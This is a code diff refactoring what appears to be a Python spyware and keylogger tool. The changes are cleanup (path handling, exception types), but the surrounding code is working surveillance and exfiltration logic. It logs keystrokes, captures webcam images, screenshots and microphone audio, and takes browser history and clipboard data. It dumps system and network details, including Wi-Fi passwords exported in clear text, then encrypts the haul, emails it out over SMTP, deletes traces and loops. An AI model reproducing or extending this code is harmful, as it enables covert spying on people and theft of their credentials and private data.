@@ -54,10 +54,9 @@ def smtp_handler(email_address: str, password: str, email: MIMEMultipart):
             session.login(email_address, password)
             # Send the email and exit session #
             session.sendmail(email_address, email_address, email.as_string())
-            session.quit()
 
     # If SMTP or socket related error occurs #
-    except (OSError, smtplib.SMTPException) as mail_err:
+    except smtplib.SMTPException as mail_err:
         print_err(f'Error occurred during email session: {mail_err}')
         logging.exception('Error occurred during email session: %s\n', mail_err)
 
@@ -119,9 +118,9 @@ def send_mail(path: Path, re_obj: object):
     email_header(msg, email_address)
 
     # Iterate through files of passed in directory #
-    for file in os.scandir(str(path.resolve())):
+    for file in os.scandir(path):
         # If current item is dir #
-        if os.path.isdir(file.name):
+        if file.is_dir():
             continue
 
         # If the file matches file extension regex's #
@@ -180,10 +179,10 @@ def encrypt_data(files: list, export_path: Path):
                 hidden_data.write(encrypted)
 
             # Delete the plain text data #
-            os.remove(str(file_path.resolve()))
+            file_path.unlink()
 
         # If error occurs during file operation #
-        except (IOError, OSError) as file_err:
+        except OSError as file_err:
             print_err(f'Error occurred during file operation: {file_err}')
             logging.exception('Error occurred during file operation: %s\n', file_err)
 
@@ -214,20 +213,19 @@ def webcam(webcam_path: Path):
     :return:  Nothing
     """
     # Create directory for webcam picture storage #
-    Path(str(webcam_path.resolve())).mkdir(parents=True, exist_ok=True)
+    webcam_path.mkdir(parents=True, exist_ok=True)
     # Initialize video capture instance #
     cam = cv2.VideoCapture(0)
 
     for current in range(1, 61):
         # Take picture of current webcam view #
         ret, img = cam.read()
-
         # If image was captured #
         if ret:
             # Format output webcam path #
             file_path = webcam_path / f'{current}_webcam.jpg'
             # Save the image to as file #
-            cv2.imwrite(str(file_path.resolve()), img)
+            cv2.imwrite(str(file_path), img)
 
         # Sleep process 5 seconds #
         time.sleep(5)
@@ -266,7 +264,7 @@ def microphone(mic_path: Path):
         sounddevice.wait()
 
         # Save the recording as proper format based on OS #
-        write_rec(str(rec_name.resolve()), frames_per_second, my_recording)
+        write_rec(str(rec_name), frames_per_second, my_recording)
 
 
 def screenshot(screenshot_path: Path):
@@ -277,7 +275,7 @@ def screenshot(screenshot_path: Path):
     :return:  Nothing
     """
     # Create directory for screenshot storage #
-    Path(str(screenshot_path.resolve())).mkdir(parents=True, exist_ok=True)
+    screenshot_path.mkdir(parents=True, exist_ok=True)
 
     for current in range(1, 61):
         # Capture screenshot #
@@ -285,7 +283,7 @@ def screenshot(screenshot_path: Path):
         # Format screenshot output path #
         capture_path = screenshot_path / f'{current}_screenshot.png'
         # Save screenshot to file #
-        pic.save(str(capture_path.resolve()))
+        pic.save(capture_path)
         # Sleep 5 seconds per iteration #
         time.sleep(5)
 
@@ -298,7 +296,7 @@ def log_keys(key_path: Path):
     :return:  Nothing
     """
     # Set the log file and format #
-    logging.basicConfig(filename=str(key_path.resolve()), level=logging.DEBUG,
+    logging.basicConfig(filename=key_path, level=logging.DEBUG,
                         format='%(asctime)s: %(message)s')
     # Join the keystroke listener thread #
     with Listener(on_press=lambda key: logging.info(str(key))) as listener:
@@ -328,7 +326,7 @@ def get_browser_history(browser_file: Path):
             browser_txt.write(json.dumps(browser_history))
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during browser history file operation: %s\n', file_err)
 
@@ -346,6 +344,7 @@ def get_clipboard(export_path: Path):
         # Copy the clipboard data #
         pasted_data = win32clipboard.GetClipboardData()
 
+    # If error occurs acquiring clipboard data #
     except (OSError, TypeError):
         pasted_data = ''
 
@@ -360,7 +359,7 @@ def get_clipboard(export_path: Path):
             clipboard_info.write(f'Clipboard Data:\n{"*" * 16}\n{pasted_data}')
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during file operation: %s\n', file_err)
 
@@ -373,36 +372,38 @@ def get_system_info(sysinfo_file: Path):
     :param sysinfo_file:  The path to the output file for the system information.
     :return:  Nothing
     """
+    # If the OS is Windows #
+    if os.name == 'nt':
+        syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
+    # If the OS is Linux #
+    else:
+        cmd0 = 'hostnamectl'
+        cmd1 = 'lscpu'
+        cmd2 = 'lsmem'
+        cmd3 = 'lsusb'
+        cmd4 = 'lspci'
+        cmd5 = 'lshw'
+        cmd6 = 'lsblk'
+        cmd7 = 'df -h'
+
+        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'
+
     try:
+        # Setup system info gathering commands child process #
         with sysinfo_file.open('a', encoding='utf-8') as system_info:
-            # If the OS is Windows #
-            if os.name == 'nt':
-                syntax = ['systeminfo', '&', 'tasklist', '&', 'sc', 'query']
-            # If the OS is Linux #
-            else:
-                cmd0 = 'hostnamectl'
-                cmd1 = 'lscpu'
-                cmd2 = 'lsmem'
-                cmd3 = 'lsusb'
-                cmd4 = 'lspci'
-                cmd5 = 'lshw'
-                cmd6 = 'lsblk'
-                cmd7 = 'df -h'
-
-                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}; {cmd4}; {cmd5}; {cmd6}; {cmd7}'
-
+            # Setup system info gathering commands child process #
             with Popen(syntax, stdout=system_info, stderr=system_info, shell=True) as get_sysinfo:
-                try:
-                    get_sysinfo.communicate(timeout=30)
-
-                except TimeoutExpired:
-                    get_sysinfo.kill()
-                    get_sysinfo.communicate()
+                # Execute child process #
+                get_sysinfo.communicate(timeout=30)
 
     # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
+    except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during file operation: %s\n', file_err)
+
+    # If process error or timeout occurs #
+    except TimeoutExpired:
+        pass
 
 
 def linux_wifi_query(export_path: Path):
@@ -414,40 +415,41 @@ def linux_wifi_query(export_path: Path):
     :param export_path:  The file path where the data to be exported resides.
     :return:  Nothing
     """
+    get_wifis = None
     # Format wifi output file path #
     wifi_path = export_path / 'wifi_info.txt'
+
     try:
-        # Open the network SSID list file in write mode #
-        with wifi_path.open('w', encoding='utf-8') as wifi_list:
-            try:
-                # Get the available Wi-Fi networks with  nmcli #
-                get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
+        # Get the available Wi-Fi networks with  nmcli #
+        get_wifis = check_output(['nmcli', '-g', 'NAME', 'connection', 'show'])
 
-            # If error occurs during process #
-            except CalledProcessError as proc_err:
-                logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)
+    # If error occurs during process #
+    except CalledProcessError as proc_err:
+        logging.exception('Error occurred during Wi-Fi SSID list retrieval: %s\n', proc_err)
 
-            # If an SSID id list was successfully retrieved #
-            if get_wifis:
-                # Iterate through command result line by line #
-                for wifi in get_wifis.split(b'\n'):
-                    # If not a wired connection #
-                    if b'Wired' not in wifi:
-                        try:
-                            with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
-                                       stderr=wifi_list, shell=True) as command:
-                                # Execute child process #
-                                command.communicate(timeout=60)
+    # If an SSID id list was successfully retrieved #
+    if get_wifis:
+        # Iterate through command result line by line #
+        for wifi in get_wifis.split(b'\n'):
+            # If not a wired connection #
+            if b'Wired' not in wifi:
+                try:
+                    # Open the network SSID list file in write mode #
+                    with wifi_path.open('w', encoding='utf-8') as wifi_list:
+                        # Setup nmcli wifi connection command child process #
+                        with Popen(f'nmcli -s connection show {wifi}', stdout=wifi_list,
+                                   stderr=wifi_list, shell=True) as command:
+                            # Execute child process #
+                            command.communicate(timeout=60)
 
-                        # If process error or timeout occurs #
-                        except TimeoutExpired:
-                            command.kill()
-                            command.communicate()
+                # If error occurs during file operation #
+                except OSError as file_err:
+                    print_err(f'Error occurred during file operation: {file_err}')
+                    logging.exception('Error occurred during file operation: %s\n', file_err)
 
-    # If error occurs during file operation #
-    except (IOError, OSError) as file_err:
-        print_err(f'Error occurred during file operation: {file_err}')
-        logging.exception('Error occurred during file operation: %s\n', file_err)
+                # If process error or timeout occurs #
+                except TimeoutExpired:
+                    pass
 
 
 def get_network_info(export_path: Path, network_file: Path):
@@ -460,41 +462,40 @@ def get_network_info(export_path: Path, network_file: Path):
     :param network_file:  A path to the file where the network information output is stored.
     :return:  Nothing
     """
+    # If the OS is Windows #
+    if os.name == 'nt':
+        # Get the saved Wi-Fi network information, IP configuration, ARP table,
+        # MAC address, routing table, and active TCP/UDP ports #
+        syntax = ['Netsh', 'WLAN', 'export', 'profile',
+                  f'folder={str(export_path)}',
+                  'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
+                  'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
+    # If the OS is Linux #
+    else:
+        # Get the Wi-Fi network information #
+        linux_wifi_query(export_path)
+
+        cmd0 = 'ifconfig'
+        cmd1 = 'arp -a'
+        cmd2 = 'route'
+        cmd3 = 'netstat -a'
+
+        # Get the IP configuration & MAC address, ARP table,
+        # routing table, and active TCP/UDP ports #
+        syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'
 
     try:
         # Open the network information file in write mode and log file in write mode #
         with network_file.open('w', encoding='utf-8') as network_io:
-            # If the OS is Windows #
-            if os.name == 'nt':
-                # Get the saved Wi-Fi network information, IP configuration, ARP table,
-                # MAC address, routing table, and active TCP/UDP ports #
-                syntax = ['Netsh', 'WLAN', 'export', 'profile',
-                          f'folder={str(export_path.resolve())}',
-                          'key=clear', '&', 'ipconfig', '/all', '&', 'arp', '-a', '&',
-                          'getmac', '-V', '&', 'route', 'print', '&', 'netstat', '-a']
-            # If the OS is Linux #
-            else:
-                # Get the Wi-Fi network information #
-                linux_wifi_query(export_path)
-
-                cmd0 = 'ifconfig'
-                cmd1 = 'arp -a'
-                cmd2 = 'route'
-                cmd3 = 'netstat -a'
-
-                # Get the IP configuration & MAC address, ARP table,
-                # routing table, and active TCP/UDP ports #
-                syntax = f'{cmd0}; {cmd1}; {cmd2}; {cmd3}'
-
-            with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
-                try:
+            try:
+                # Setup network info gathering commands child process #
+                with Popen(syntax, stdout=network_io, stderr=network_io, shell=True) as commands:
                     # Execute child process #
                     commands.communicate(timeout=60)
 
-                # If execution timeout occurred #
-                except TimeoutExpired:
-                    commands.kill()
-                    commands.communicate()
+            # If execution timeout occurred #
+            except TimeoutExpired:
+                pass
 
             # Get the hostname #
             hostname = socket.gethostname()
@@ -511,10 +512,10 @@ def get_network_info(export_path: Path, network_file: Path):
 
             # Log the public and private IP address #
             network_io.write(f'[!] Public IP Address: {public_ip}\n'
-                             f'[!] Private IP Address: {str(ip_addr)}\n')
+                             f'[!] Private IP Address: {ip_addr}\n')
 
     # If error occurs during file operation #
-    except (OSError, IOError) as file_err:
+    except OSError as file_err:
         print_err(f'Error occurred during file operation: {file_err}')
         logging.exception('Error occurred during file operation: %s\n', file_err)
 
@@ -534,8 +535,8 @@ def main():
         export_path = Path('/tmp/logs/')
 
     # Ensure the tmp exfiltration dir exists #
-    Path(str(export_path.resolve())).mkdir(parents=True, exist_ok=True)
-    # Format program files and dirs #
+    export_path.mkdir(parents=True, exist_ok=True)
+    # Set program files and dirs #
     network_file = export_path / 'network_info.txt'
     sysinfo_file = export_path / 'system_info.txt'
     browser_file = export_path / 'browser_info.txt'
@@ -587,7 +588,7 @@ def main():
         files.append('clipboard_info.txt')
 
         # Append file to file list if item is file and match xml regex #
-        [files.append(file.name) for file in os.scandir(str(export_path.resolve()))
+        [files.append(file.name) for file in os.scandir(export_path)
          if regex_obj.re_xml.match(file.name)]
     # If the OS is Linux #
     else:
@@ -602,7 +603,7 @@ def main():
     send_mail(webcam_dir, regex_obj)
 
     # Clean Up Files #
-    shutil.rmtree(str(export_path.resolve()))
+    shutil.rmtree(export_path)
     # Loop #
     main()
 
